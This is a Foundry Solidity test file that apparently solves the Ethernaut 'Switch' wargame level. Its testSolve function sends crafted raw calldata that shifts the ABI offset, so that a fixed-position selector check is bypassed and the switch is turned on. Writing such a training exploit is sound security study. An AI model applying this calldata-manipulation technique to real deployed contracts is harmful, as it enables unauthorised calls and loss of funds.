// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Switch} from "src/levels/Switch.sol";
import {SwitchFactory} from "src/levels/SwitchFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestSwitch is Test, Utils {
    Ethernaut ethernaut;
    Switch instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        SwitchFactory factory = new SwitchFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Switch(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("flipSwitch(bytes)")), abi.encodeWithSelector(bytes4(keccak256("turnSwitchOff()")))
        );
        (bool success, bytes memory err) = address(instance).call(data);
        if (!success) {
            console.logBytes(err);
        }
        assertTrue(!instance.switchOn());

        data =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff20606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (success, err) = address(instance).call(data);
        if (!success) {
            console.logBytes(err);
        }

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
